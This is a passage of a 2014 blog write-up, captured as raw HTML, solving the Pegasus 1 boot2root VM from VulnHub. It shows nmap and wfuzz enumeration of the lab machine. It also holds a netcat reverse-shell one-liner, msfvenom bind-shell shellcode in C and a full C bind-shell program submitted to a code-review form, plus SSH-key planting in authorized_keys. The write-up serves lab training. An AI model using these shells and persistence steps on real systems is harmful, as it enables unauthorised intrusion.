Pegasus :)\njohn@pegasus:~$ /opt/nfs/shell # id uid=0(root) gid=0(root) groups=0(root),1000(john) flag :) # cat /root/flag , |`\\ /'_/_ ,'_/\\_/\\_ , ,'_/\\'_\\_,/_ ,'| ,'_/\\_'_ \\_ \\_/ _,-'_/ ,'_/'\\_'_ \\_ \\'_,\\ _,-'_,-/ \\, Pegasus is one of the best ,' /_\\ _'_ \\_ \\'_,/ __,-'6` 7 \\'_,/ ,-' _,-,'\\,_'_ \\,_/'_,\\ stallion usually depicted \\/- _/ 7 '/ _,' _/'\\_ \\,_'_ \\_ \\'_,/ as pure white in color. \\_'/ 7'_/' _/' \\_ '\\,_'_ \\_ \\'_,\\ Symbol of wisdom and fame. / _ ,V ,`\\_ It was a hardware clone of / `, |`\\_ the Nintendo Famicom. / \\ / \\ `\\ / __/| / / `\\ (` ( (` (_ \\ / / ,/ | / / \\ / ,/ | / \\ `\\_ _/_/ |/ /__/,_/ /_( /_( CONGRATULATIONS! You made it :) Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you learnt a thing or two while doing it! :) Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and providing first review. Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode and leave some feedback, I would love to hear from you! Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for more awesome boot2root VMs! Thanks for the fun @TheKnapsy\n","wordCount":"4426","inLanguage":"en","datePublished":"2014-12-23T08:29:49Z","dateModified":"2014-12-23T08:29:49Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
hoof to root solving pegasus 1
</h1>
<div class=post-meta>December 23, 2014&nbsp;·&nbsp;21 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-12-23-hoof-to-root-solving-pegasus-1.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#introduction aria-label=introduction>introduction</a></li>
<li>
<a href=#nmap-again aria-label="nmap, again">nmap, again</a></li>
<li>
<a href=#stomping-some-hoofs-with-pegasus aria-label="stomping some hoofs with pegasus">stomping some hoofs with pegasus</a></li>
<li>
<a href=#pwning-mike aria-label="pwning mike">pwning mike</a></li>
<li>
<a href=#my_first-your_first-we_all_first aria-label="my_first, your_first, we_all_first">my_first, your_first, we_all_first</a><ul>
<li>
<a href=#rebuilding-mainc aria-label="rebuilding main.c">rebuilding main.c</a></li>
<li>
<a href=#the-calculator-with-a-hole aria-label="the calculator with a hole">the calculator with a hole</a></li>
<li>
<a href=#punching-more-than-numbers aria-label="punching more than numbers">punching more than numbers</a><ul>
<li>
<a href=#compiling-the-format-string aria-label="compiling the format string">compiling the format string</a></li>
<li>
<a href=#finishing-the-exploit aria-label="finishing the exploit">finishing the exploit</a></li></ul>
</li></ul>
</li>
<li>
<a href=#hoofing-rooting-pegasus aria-label="hoofing (rooting) Pegasus">hoofing (rooting) Pegasus</a></li>
<li>
<a href=#flag- aria-label="flag :)">flag :)</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=introduction>introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
<p><a href=https://www.vulnhub.com/entry/pegasus-1,109/>Pegasus 1</a> is a boot2root hosted on <a href=https://www.vulnhub.com/>VulnHub</a> built by <a href=https://twitter.com/theknapsy>@TheKnapsy</a>. He wrote a <a href=http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/>blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>
<figure>
<img loading=lazy src=/images/pegasus_logo.png>
</figure>
<p>Having recently played in the <a href=https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/>Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&mldr; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>
<p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>
<p>Lets begin.</p>
<h2 id=nmap-again>nmap, again<a hidden class=anchor aria-hidden=true href=#nmap-again>#</a></h2>
<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&mldr; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap --reason -sV 192.168.56.101 -p-

Starting Nmap 6.47 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-12-23 09:16 SAST
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.101
Host is up, received arp-response <span style=color:#f92672>(</span>0.00022s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65531</span> closed ports
Reason: <span style=color:#ae81ff>65531</span> resets
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
111/tcp   open  rpcbind syn-ack 2-4 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100000)</span>
8088/tcp  open  http    syn-ack nginx 1.1.19
55625/tcp open  status  syn-ack <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100024)</span>
MAC Address: 08:00:27:88:F8:40 <span style=color:#f92672>(</span>Cadmus Computer Systems<span style=color:#f92672>)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 16.37 seconds
</code></pre></div><p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>
<h2 id=stomping-some-hoofs-with-pegasus>stomping some hoofs with pegasus<a hidden class=anchor aria-hidden=true href=#stomping-some-hoofs-with-pegasus>#</a></h2>
<p>Browsing to http://192.168.56.101:8088/, we are presented with a picture of Pegasus:</p>
<figure>
<img loading=lazy src=/images/pegasus_web.png>
</figure>
<p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>
<figure>
<img loading=lazy src=/images/pegasus_nginx_index.png>
</figure>
<p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc <span style=color:#ae81ff>404</span> http://192.168.56.101:8088/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.101:8088/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
<span style=color:#f92672>==================================================================</span>
ID  Response   Lines      Word         Chars          Request
<span style=color:#f92672>==================================================================</span>

01426:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>      <span style=color:#ae81ff>0</span> L         <span style=color:#ae81ff>4</span> W       <span style=color:#ae81ff>19</span> Ch    <span style=color:#e6db74>&#34; - submit&#34;</span>
</code></pre></div><p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to http://192.168.56.101:8088/submit.php:</p>
<figure>
<img loading=lazy src=/images/pegasus_submit.png>
</figure>
<p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>
<p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>
<figure>
<img loading=lazy src=/images/pegasus_code_review.png>
</figure>
<h2 id=pwning-mike>pwning mike<a hidden class=anchor aria-hidden=true href=#pwning-mike>#</a></h2>
<p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>
<p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>
<p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>
<p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>
<figure>
<img loading=lazy src=/images/pegasus_code_review_security.png>
</figure>
<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href=http://php.net/manual/en/function.system.php>system</a>, or C due to its <a href=http://linux.die.net/man/3/system>system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>
<p><em>insert fade to black</em></p>
<p><em>CAPTION: many hours later</em></p>
<p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
</span><span style=color:#75715e></span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> buf[] <span style=color:#f92672>=</span>
<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80</span><span style=color:#e6db74>&#34;</span>
<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a</span><span style=color:#e6db74>&#34;</span>
<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0</span><span style=color:#e6db74>&#34;</span>
<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f</span><span style=color:#e6db74>&#34;</span>
<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0</span><span style=color:#e6db74>&#34;</span>
<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0b\xcd\x80</span><span style=color:#e6db74>&#34;</span>;

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
{
    <span style=color:#66d9ef>int</span> (<span style=color:#f92672>*</span>ret)() <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>(<span style=color:#f92672>*</span>)())buf;
    ret();
}
</code></pre></div><p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href=http://bigpointyteeth.se/code/bindshell.c>this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za
</span><span style=color:#75715e>// http://bigpointyteeth.se/code/bindshell.c
</span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;arpa/inet.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>#define SHELL &#34;/bin/sh&#34;   </span><span style=color:#75715e>// shell to execute
</span><span style=color:#75715e></span><span style=color:#75715e>#define NAME &#34;rsync&#34;        </span><span style=color:#75715e>// name of the forked bindshell shown in ps
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
    <span style=color:#66d9ef>char</span> msg[<span style=color:#ae81ff>16</span>];
    <span style=color:#66d9ef>int</span> srv_sockfd, new_sockfd;
    socklen_t new_addrlen;
    <span style=color:#66d9ef>struct</span> sockaddr_in srv_addr, new_addr;

    <span style=color:#75715e>// fork into background
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
        <span style=color:#66d9ef>if</span> ((srv_sockfd <span style=color:#f92672>=</span> socket(PF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
        }

        srv_addr.sin_family <span style=color:#f92672>=</span> PF_INET;
        srv_addr.sin_port <span style=color:#f92672>=</span> htons(atoi(<span style=color:#e6db74>&#34;4444&#34;</span>));
        srv_addr.sin_addr.s_addr <span style=color:#f92672>=</span> htonl(INADDR_ANY);

        <span style=color:#66d9ef>if</span> (bind(srv_sockfd, (<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>srv_addr, <span style=color:#66d9ef>sizeof</span>(srv_addr)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
        }

        <span style=color:#66d9ef>if</span> (listen(srv_sockfd, <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
        }

        <span style=color:#75715e>// accept loop
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>for</span> (;;) {
            new_addrlen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(new_addr);
            new_sockfd <span style=color:#f92672>=</span> accept(srv_sockfd, (<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>new_addr, <span style=color:#f92672>&amp;</span>new_addrlen);
            <span style=color:#66d9ef>if</span> (new_sockfd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
                <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
            }

            <span style=color:#75715e>// fork to handle new connection
</span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> (fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
                <span style=color:#75715e>// close old listener
</span><span style=color:#75715e></span>                close(srv_sockfd);
                <span style=color:#75715e>// print the parent pid which should be killed in order
</span><span style=color:#75715e></span>                <span style=color:#75715e>// to remove the persistant bindshell listener
</span><span style=color:#75715e></span>                sprintf(msg, <span style=color:#e6db74>&#34;ppid=%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, getppid());
                write(new_sockfd, msg, strlen(msg));

                dup2(new_sockfd, <span style=color:#ae81ff>2</span>);
                dup2(new_sockfd, <span style=color:#ae81ff>1</span>);
                dup2(new_sockfd, <span style=color:#ae81ff>0</span>);

                execl(SHELL, NAME, NULL);
                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
            }
            <span style=color:#66d9ef>else</span>
                close(new_sockfd);
        } <span style=color:#75715e>// end accept loop
</span><span style=color:#75715e></span>    } <span style=color:#75715e>// end fork into background
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap 192.168.56.101 -p <span style=color:#ae81ff>4444</span>

Starting Nmap 6.47 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-12-23 11:33 SAST
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.101
Host is up <span style=color:#f92672>(</span>0.00034s latency<span style=color:#f92672>)</span>.
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 08:00:27:88:F8:40 <span style=color:#f92672>(</span>Cadmus Computer Systems<span style=color:#f92672>)</span>

Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 0.17 seconds
</code></pre></div><p>Awesome, so lets connect and see what we have:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nc -v 192.168.56.101 <span style=color:#ae81ff>4444</span>
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
<span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.56.101<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span> open
ppid<span style=color:#f92672>=</span><span style=color:#ae81ff>10450</span>
id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span>
</code></pre></div><p>As was hoped for, a shell as <code>mike</code>. I quickly generated a new ssh key pair for Pegasus, and cat the public key to <code>mike</code>&rsquo;s <code>authorized_keys</code> file and went on to SSH in as mike:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># first I cat the public key so that I can copy it</span>
root@kali:~# cat pegasus.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali

<span style=color:#75715e># next I connect to the bind shell listener and move to Mikes .shh directory</span>
root@kali:~# nc -v 192.168.56.101 <span style=color:#ae81ff>4444</span>
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
<span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.56.101<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span> open
ppid<span style=color:#f92672>=</span><span style=color:#ae81ff>10450</span>
cd .ssh

<span style=color:#75715e># next we append my public key to mikes authorized_keys</span>
echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&#34;</span> &gt;&gt; authorized_keys
ls -lh
total 12K
-rw-rw-r-- <span style=color:#ae81ff>1</span> mike mike  <span style=color:#ae81ff>381</span> Dec <span style=color:#ae81ff>23</span> 20:36 authorized_keys
-rw------- <span style=color:#ae81ff>1</span> mike mike 1.7K Nov <span style=color:#ae81ff>18</span> 12:39 id_rsa
-rw-r--r-- <span style=color:#ae81ff>1</span> mike mike  <span style=color:#ae81ff>222</span> Nov <span style=color:#ae81ff>18</span> 17:39 known_hosts
chmod <span style=color:#ae81ff>600</span> authorized_keys
^C

<span style=color:#75715e># with the authorized_keys ready, I SSH in as mike using my key pair</span>
root@kali:~# ssh mike@192.168.56.101 -i pegasus
Welcome to Ubuntu 12.04.5 LTS <span style=color:#f92672>(</span>GNU/Linux 3.13.0-39-generic i686<span style=color:#f92672>)</span>

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Dec <span style=color:#ae81ff>23</span> 20:36:47 AEDT <span style=color:#ae81ff>2014</span>

  System load:  0.0               Processes:           <span style=color:#ae81ff>93</span>
  Usage of /:   6.8% of 18.32GB   Users logged in:     <span style=color:#ae81ff>0</span>
  Memory usage: 12%               IP address <span style=color:#66d9ef>for</span> eth0: 192.168.56.101
  Swap usage:   0%

  <span style=color:#f92672>=</span>&gt; There are <span style=color:#ae81ff>2</span> zombie processes.

  Graph this data and manage this system at:
    https://landscape.canonical.com/


Your Hardware Enablement Stack <span style=color:#f92672>(</span>HWE<span style=color:#f92672>)</span> is supported <span style=color:#66d9ef>until</span> April 2017.

You have mail.
Last login: Tue Dec <span style=color:#ae81ff>16</span> 19:27:53 <span style=color:#ae81ff>2014</span> from 172.16.246.129
mike@pegasus:~$
</code></pre></div><h2 id=my_first-your_first-we_all_first>my_first, your_first, we_all_first<a hidden class=anchor aria-hidden=true href=#my_first-your_first-we_all_first>#</a></h2>
<p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ls -lh
total 16K
-rwxr-xr-x <span style=color:#ae81ff>1</span> mike mike  <span style=color:#ae81ff>845</span> Nov <span style=color:#ae81ff>18</span> 20:52 check_code.sh
drwx------ <span style=color:#ae81ff>2</span> mike mike 4.0K Nov <span style=color:#ae81ff>18</span> 17:49 Mail
-rwsr-xr-x <span style=color:#ae81ff>1</span> john john 6.5K Nov <span style=color:#ae81ff>28</span> 10:26 my_first
</code></pre></div><p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ls -lh /opt/
total 12K
drwxrwxrwx <span style=color:#ae81ff>2</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 20:33 code_review
drwxr-xr-x <span style=color:#ae81ff>3</span> root root 4.0K Nov <span style=color:#ae81ff>25</span> 04:38 git
drwxr-xr-x <span style=color:#ae81ff>2</span> root root 4.0K Nov <span style=color:#ae81ff>18</span> 14:43 nfs
</code></pre></div><p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>
<p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>
<h3 id=rebuilding-mainc>rebuilding main.c<a hidden class=anchor aria-hidden=true href=#rebuilding-mainc>#</a></h3>
<p><em>This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless</em></p>
<p>Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:/opt/git/my_first.git$ git log
commit 85365946a8142c52ee6040a029dd069b514c2ab0
Author: Mike Ross &lt;mike@pegasus.<span style=color:#f92672>(</span>none<span style=color:#f92672>)</span>&gt;
Date:   Tue Nov <span style=color:#ae81ff>25</span> 04:48:01 <span style=color:#ae81ff>2014</span> +1100

    Committing some security fixes

commit 0a8af1ed956518ec078b152ad7571105e2df26c6
